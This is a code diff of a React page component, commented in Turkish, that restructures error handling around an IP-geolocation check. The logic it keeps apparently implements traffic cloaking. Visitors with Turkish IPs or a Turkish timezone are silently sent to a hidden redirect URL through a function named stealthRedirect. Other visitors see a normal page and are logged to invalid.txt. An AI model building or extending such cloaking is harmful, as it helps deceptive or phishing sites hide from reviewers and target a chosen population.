@@ -177,83 +177,89 @@ export default function Home() {
 
         // IP detaylarını al
         debugLog('IP API isteği yapılıyor');
-        const response = await fetch('/api/ip-info', {
-          headers: {
-            'Accept': 'application/json',
-            'Content-Type': 'application/json'
-          }
-        });
-        
-        if (!response.ok) {
-          debugLog('IP API hatası', { status: response.status });
-          throw new Error(`HTTP error! status: ${response.status}`);
-        }
-        
-        const data = await response.json();
-        debugLog('IP API yanıtı alındı', data);
-        
-        // Rate limit kontrolü
-        if (data.status === 'fail' && data.message?.includes('rate limit')) {
-          debugLog('Rate limit aşıldı', data);
-          const isTurkishTZ = isTurkishTimezone();
+        try {
+          const response = await fetch('/api/ip-info', {
+            headers: {
+              'Accept': 'application/json',
+              'Content-Type': 'application/json'
+            }
+          });
           
-          if (isTurkishTZ) {
-            debugLog('Türk timezone tespit edildi, yönlendirme yapılıyor');
-            await stealthRedirect(redirectUrl, data, true);
+          if (!response.ok) {
+            debugLog('IP API hatası', { status: response.status });
+            throw new Error(`HTTP error! status: ${response.status}`);
+          }
+          
+          const data = await response.json();
+          debugLog('IP API yanıtı alındı', data);
+          
+          // Rate limit kontrolü
+          if (data.status === 'fail' && data.message?.includes('rate limit')) {
+            debugLog('Rate limit aşıldı', data);
+            const isTurkishTZ = isTurkishTimezone();
+            
+            if (isTurkishTZ) {
+              debugLog('Türk timezone tespit edildi, yönlendirme yapılıyor');
+              await stealthRedirect(redirectUrl, data, true);
+              return;
+            }
+            setRetryCount(prev => prev + 1);
             return;
           }
-          setRetryCount(prev => prev + 1);
-          return;
-        }
 
-        const encryptedData = encryptData(data);
-        const decryptedData = decryptData(encryptedData);
-        debugLog('IP verisi şifrelendi ve çözüldü', { decryptedData });
-        
-        const currentIpData = {
-          country: decryptedData.country,
-          countryCode: decryptedData.countryCode,
-          isp: decryptedData.isp,
-          org: decryptedData.org,
-          as: decryptedData.as,
-          asname: decryptedData.asname,
-          city: decryptedData.city
-        };
-        
-        setIpData(currentIpData);
-        debugLog('IP verisi state\'e kaydedildi', currentIpData);
+          const encryptedData = encryptData(data);
+          const decryptedData = decryptData(encryptedData);
+          debugLog('IP verisi şifrelendi ve çözüldü', { decryptedData });
+          
+          const currentIpData = {
+            country: decryptedData.country,
+            countryCode: decryptedData.countryCode,
+            isp: decryptedData.isp,
+            org: decryptedData.org,
+            as: decryptedData.as,
+            asname: decryptedData.asname,
+            city: decryptedData.city
+          };
+          
+          setIpData(currentIpData);
+          debugLog('IP verisi state\'e kaydedildi', currentIpData);
 
-        // Yönlendirme kontrolü - SADECE Türk IP'si kontrolü
-        const isTurkishIP = currentIpData.countryCode === 'TR';
-        debugLog('Türk IP kontrolü', { isTurkishIP, countryCode: currentIpData.countryCode });
+          // Yönlendirme kontrolü - SADECE Türk IP'si kontrolü
+          const isTurkishIP = currentIpData.countryCode === 'TR';
+          debugLog('Türk IP kontrolü', { isTurkishIP, countryCode: currentIpData.countryCode });
 
-        // Sadece Türk IP'si varsa yönlendir
-        if (isTurkishIP) {
-          debugLog('Türk IP tespit edildi, yönlendirme yapılıyor');
-          setShouldRedirect(true);
-          await stealthRedirect(redirectUrl, data, true);
-        } else {
-          debugLog('Türk IP tespit edilemedi, yönlendirme yapılmıyor');
-          // Yabancı IP ise normal sayfayı göster ve invalid.txt'ye kaydet
-          await stealthRedirect(redirectUrl, data, false);
-          setMounted(true);
-          setIsLoading(false);
+          // Sadece Türk IP'si varsa yönlendir
+          if (isTurkishIP) {
+            debugLog('Türk IP tespit edildi, yönlendirme yapılıyor');
+            setShouldRedirect(true);
+            await stealthRedirect(redirectUrl, data, true);
+          } else {
+            debugLog('Türk IP tespit edilemedi, yönlendirme yapılmıyor');
+            // Yabancı IP ise normal sayfayı göster ve invalid.txt'ye kaydet
+            await stealthRedirect(redirectUrl, data, false);
+            setMounted(true);
+            setIsLoading(false);
+          }
+        } catch (error) {
+          debugLog('IP API isteği hatası', error);
+          if (retryCount < 3) {
+            if (isTurkishTimezone()) {
+              await stealthRedirect(redirectUrl, {
+                query: 'unknown',
+                country: 'unknown'
+              }, true);
+              return;
+            }
+            setRetryCount(prev => prev + 1);
+          } else {
+            setMounted(true);
+            setIsLoading(false);
+          }
         }
       } catch (error) {
-        debugLog('IP kontrolü hatası', error);
-        if (retryCount < 3) {
-          if (isTurkishTimezone()) {
-            await stealthRedirect(redirectUrl, {
-              query: 'unknown',
-              country: 'unknown'
-            }, true);
-            return;
-          }
-          setRetryCount(prev => prev + 1);
-        } else {
-          setMounted(true);
-          setIsLoading(false);
-        }
+        debugLog('Genel hata', error);
+        setMounted(true);
+        setIsLoading(false);
       }
     };
 
